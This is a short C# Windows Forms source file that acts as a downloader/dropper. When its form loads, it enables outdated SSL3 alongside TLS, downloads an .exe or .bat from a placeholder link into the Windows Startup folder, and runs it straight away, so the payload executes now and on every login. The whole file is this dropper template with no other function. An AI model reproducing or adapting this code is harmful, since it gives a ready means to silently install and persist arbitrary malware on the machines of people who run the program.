using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;


namespace santez
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls
            | SecurityProtocolType.Tls11

            | SecurityProtocolType.Tls12

            | SecurityProtocolType.Ssl3;

            WebClient client = new WebClient();
            client.DownloadFile("exe or bat file direct link", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\santez.bat/exe");
            System.Diagnostics.Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\santez.bat/exe");
        }
    }
}
